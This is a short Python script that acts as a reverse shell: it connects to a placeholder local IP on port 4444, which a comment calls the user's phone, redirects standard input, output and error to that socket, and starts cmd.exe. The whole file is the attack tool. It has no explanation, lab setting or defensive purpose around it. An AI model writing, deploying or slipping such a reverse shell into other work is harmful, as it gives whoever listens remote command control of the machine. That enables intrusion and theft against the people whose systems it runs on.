import socket
import subprocess
import os

# Replace with your phone's local IP (e.g., 192.168.1.XX)
SERVER_IP = "192.168.1.XX"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_IP, PORT))

# Redirect standard input/output to the socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Start a shell
subprocess.call(["cmd.exe"])
